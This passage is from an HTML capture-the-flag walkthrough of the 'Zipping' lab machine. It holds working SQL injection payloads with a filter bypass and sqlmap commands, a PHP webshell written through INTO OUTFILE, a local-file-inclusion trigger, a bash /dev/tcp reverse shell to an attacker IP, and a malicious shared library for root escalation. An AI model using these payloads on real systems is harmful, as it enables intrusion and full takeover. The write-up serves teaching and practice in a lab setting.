+                <p>This code includes <code>functions.php</code> which provides the necessary PDO connection. I also notice a potentially vulnerable inclusion pattern with the <code>page</code> parameter, although the <code>file_exists()</code> check and <code>.php</code> concatenation make immediate exploitation difficult.</p>
+
+                <h2>preg_match() Filter Bypass and SQL Injection</h2>
+                
+                <h3>Identifying the Bypass</h3>
+                <p>After experimenting with different payloads, I discover that I can bypass the first <code>preg_match()</code> check using <code>%0A</code> (newline character). Additionally, I can bypass the second check by ending the query with a number.</p>
+
+                <p>For example, this URL successfully returns the first watch:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=product&id=%0A'or+1=1--+-1</code></pre>
+
+                <h3>Testing with SQLMap</h3>
+                <p>I attempt to automate exploitation with <code>sqlmap</code> using the <code>--prefix</code> and <code>--suffix</code> options:</p>
+                <pre><code class="language-bash">sqlmap -u "http://10.10.11.229/shop/index.php?page=product&id=1" --prefix "%0A'" --suffix="-- -1" -p id --batch</code></pre>
+
+                <p>SQLMap confirms the SQL injection vulnerability via stacked queries:</p>
+                <pre><code class="language-plaintext">---
+Parameter: id (GET)
+Type: stacked queries
+Title: MySQL >= 5.0.12 stacked queries (comment)
+Payload: page=product&id=1
+';SELECT SLEEP(5)'-- -1
+---</code></pre>
+
+                <p>However, this technique is slow. By specifying the UNION technique, which is more efficient, I get better results:</p>
+                <pre><code class="language-bash">sqlmap -u "http://10.10.11.229/shop/index.php?page=product&id=*" --prefix "%0A'" --suffix="-- -1" -p id --batch --technique=U</code></pre>
+
+                <p>SQLMap finds a valid UNION injection:</p>
+                <pre><code class="language-plaintext">---
+Parameter: #1* (URI)
+Type: UNION query
+Title: Generic UNION query (NULL) - 8 columns
+Payload: http://10.10.11.229/shop/index.php?page=product&id=
+' UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT('qvpbq','zWkYmxHsuJaSOwYtwOLmKxQQKniHkiatglNcdvSB'),'qbzzq'),NULL,NULL,NULL,NULL-- -1
+---</code></pre>
+
+                <h3>Database Enumeration</h3>
+                <p>I enumerate the available databases:</p>
+                <pre><code class="language-plaintext">information_schema, mysql, performance_schema, sys, zipping</code></pre>
+
+                <p>The <code>zipping</code> database only contains test data without useful information. However, when reviewing <code>information_schema</code> to check privileges, I discover something crucial:</p>
+                <pre><code class="language-plaintext">| 'root'@'localhost' | YES | def | FILE</code></pre>
+
+                <p>The MySQL user has the <code>FILE</code> privilege, which means I can interact with the filesystem within MySQL's access limits. According to <a href="https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file">MySQL documentation</a>, this allows reading and writing files on the server.</p>
+
+                <h2>Webshell Writing via SQL Injection</h2>
+                
+                <h3>Exploitation Strategy</h3>
+                <p>With the <code>FILE</code> privilege, I can use SQL injection to write files on the server. My goal is to write a PHP webshell that allows me to execute commands.</p>
+
+                <p>Although I attempt to use <code>sqlmap</code> to write files, I'm unsuccessful, so I proceed manually. I construct this UNION SQL injection query:</p>
+                <pre><code class="language-sql">UNION ALL SELECT NULL,NULL,NULL,'&lt;?php system($_GET["cmd"]); ?&gt;',NULL,NULL,NULL,NULL INTO OUTFILE '/dev/shm/xd.php'-- -1</code></pre>
+
+                <p>The complete URL with URL encoding is:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=product&id=%0A%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,%27%3C?php%20system($_GET%5B%22cmd%22%5D);%20?%3E%27,NULL,NULL,NULL,NULL%20INTO%20OUTFILE%20%27/dev/shm/xd.php%27--%20-1</code></pre>
+
+                <h3>Write Directory Selection</h3>
+                <p>I initially tried to write to <code>/tmp</code>, but Apache appears to be using a sandbox environment that prevents access to that directory. Instead, I manage to write to <code>/dev/shm/</code>, which is a temporary in-memory filesystem.</p>
+
+                <p>I verify that the webshell has been written correctly using the previously discovered path traversal:</p>
+                <pre><code class="language-plaintext">============================================================
+Contents of /dev/shm/xd.php:
+============================================================
+\N \N \N &lt;?php system($_GET["cmd"]); ?&gt; \N \N \N \N</code></pre>
+
+                <h2>Local File Inclusion and Initial Access</h2>
+                
+                <h3>Exploiting LFI</h3>
+                <p>Remembering the potential LFI vulnerability in <code>/shop/index.php</code>, I attempt to access my webshell. Although the code adds <code>.php</code> at the end and verifies the file exists, I can take advantage of my file being at <code>/dev/shm/xd.php</code>:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=/dev/shm/xd&cmd=id</code></pre>
+
+                <p>The webshell works:</p>
+                <p><img src="./media/image6.png" alt="Webshell successfully executing showing the output of the id command" /></p>
+
+                <h3>Obtaining Reverse Shell</h3>
+                <p>With command execution confirmed, I send myself a reverse shell using this payload:</p>
+                <pre><code class="language-bash">bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"</code></pre>
+
+                <p>Complete URL encoded:</p>
+                <pre><code class="language-plaintext">http://10.10.11.229/shop/index.php?page=/dev/shm/xd&cmd=bash -c "bash -i >%26 /dev/tcp/10.10.16.2/443 0>%261"</code></pre>
+
+                <p>I set up a <code>netcat</code> listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>And successfully receive the connection as user <code>rektsu</code>:</p>
+                <pre><code class="language-plaintext">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.229] 37454
+bash: cannot set terminal process group (1133): Inappropriate ioctl for device
+bash: no job control in this shell
+rektsu@zipping:/var/www/html/shop$</code></pre>
+
+                <p>I now have access as <code>rektsu</code> and can read the user flag.</p>
+
+                <h2>Privilege Escalation: Shared Library Hijacking</h2>
+                
+                <h3>Sudo Privilege Enumeration</h3>
+                <p>I check the <code>sudo</code> privileges of user <code>rektsu</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The result shows something interesting:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for rektsu on zipping:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User rektsu may run the following commands on zipping:
+    (ALL) NOPASSWD: /usr/bin/stock</code></pre>
+
+                <p>The user can execute <code>/usr/bin/stock</code> with <code>sudo</code> without a password. I verify the file type:</p>
+                <pre><code class="language-bash">file /usr/bin/stock</code></pre>
+
+                <pre><code class="language-plaintext">/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, 
+interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, 
+for GNU/Linux 3.2.0, not stripped</code></pre>
+
+                <p>It's a 64-bit ELF binary, dynamically linked and not stripped of symbols.</p>
+
+                <h3>Binary Analysis</h3>
+                <p>When running the binary, it requests a password:</p>
+                <pre><code class="language-bash">sudo /usr/bin/stock</code></pre>
+
+                <pre><code class="language-plaintext">Enter the password:</code></pre>
+
+                <p>Using <code>strings</code> on the binary, I find the password: <code>St0ckM4nager</code>.</p>
+
+                <p>The program appears to be a simple inventory management system that stores values in <code>/root/.stock.csv</code>. The main menu displays:</p>
+                <pre><code class="language-plaintext">================== Stock Actual ==================
+Colour Black Gold Silver
+Amount 4 2237 5
+Quality Excelent Average Poor
+Amount 4 15 2227
+Exclusive Yes No
+Amount 4 2241
+Warranty Yes No
+Amount 4 2241</code></pre>
+
+                <h3>Dynamic Analysis with ltrace</h3>
+                <p>Finding no obvious vulnerabilities through manual testing, I use <code>ltrace</code> with the <code>-s 4096</code> option to capture library function calls without truncation:</p>
+                <pre><code class="language-bash">ltrace -s 4096 ./stock</code></pre>
+
+                <p>The output reveals a crucial call:</p>
+                <pre><code class="language-plaintext">printf("Enter the password: ") = 20
+fgets(Enter the password: St0ckM4nager
+"St0ckM4nager\n", 30, 0x7ff94db528e0) = 0x7ffd17efa040
+strchr("St0ckM4nager\n", '\n') = "\n"
+strcmp("St0ckM4nager", "St0ckM4nager") = 0
+dlopen("/home/rektsu/.config/libcounter.so0", 1) = nil</code></pre>
+
+                <p>The binary attempts to load a shared library from <code>/home/rektsu/.config/libcounter.so</code>! The <code>dlopen()</code> call returns <code>nil</code>, meaning the library doesn't exist.</p>
+
+                <h3>Verifying the Path</h3>
+                <p>I confirm the directory exists but is empty:</p>
+                <pre><code class="language-bash">ls -la /home/rektsu/.config</code></pre>
+
+                <pre><code class="language-plaintext">total 8
+drwxrwxr-x 2 rektsu rektsu 4096 May 4 2023 .
+drwxr-x--x 7 rektsu rektsu 4096 Aug 7 2023 ..</code></pre>
+
+                <h3>Exploitation via Malicious Library</h3>
+                <p>This is a perfect vulnerability for shared library hijacking. If I place a malicious library in the expected path, the binary will load it when executed with <code>sudo</code>, allowing me to execute code as <code>root</code>.</p>
+
+                <p>I create a C file with a constructor function that will automatically execute when the library is loaded:</p>
+                <pre><code class="language-c">#include &lt;stdlib.h&gt;
+
+__attribute__ ((__constructor__))
+void shell(void){
+    system("/bin/bash");
+}</code></pre>
+
+                <p>The <code>__constructor__</code> attribute marks the <code>shell()</code> function as a constructor, which ensures it executes immediately when the library is loaded by <code>dlopen()</code>.</p>
+
+                <h3>Compilation and Transfer</h3>
+                <p>I compile the code as a shared library using <code>gcc</code>:</p>
+                <pre><code class="language-bash">gcc -shared -o libcounter.so -fPIC xd.c</code></pre>
+
+                <p>The important options are:</p>
+                <ul>
+                    <li><code>-shared</code>: Produces a shared library</li>
+                    <li><code>-fPIC</code>: Generates Position Independent Code, necessary for shared libraries</li>
+                </ul>
+
+                <p>I transfer the library to the victim machine directly to the expected directory:</p>
+                <pre><code class="language-bash">ls -la /home/rektsu/.config</code></pre>
+
+                <pre><code class="language-plaintext">total 24
+drwxrwxr-x 2 rektsu rektsu 4096 Dec 29 17:07 .
+drwxr-x--x 7 rektsu rektsu 4096 Aug 7 2023 ..
+-rw-r--r-- 1 rektsu rektsu 15376 Dec 29 16:57 libcounter.so</code></pre>
+
+                <h3>Getting Root</h3>
+                <p>With the malicious library in place, I execute the binary with <code>sudo</code>:</p>
+                <pre><code class="language-bash">sudo /usr/bin/stock</code></pre>
+
+                <p>I enter the password <code>St0ckM4nager</code>, and when the program attempts to load <code>libcounter.so</code> via <code>dlopen()</code>, my constructor executes and I get a shell as <code>root</code>:</p>
+                <pre><code class="language-plaintext">Enter the password: St0ckM4nager
+root@zipping:/home/rektsu/.config#</code></pre>
+
+                <p>I now have complete access as <code>root</code> and can read the final flag, thus completing the machine.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
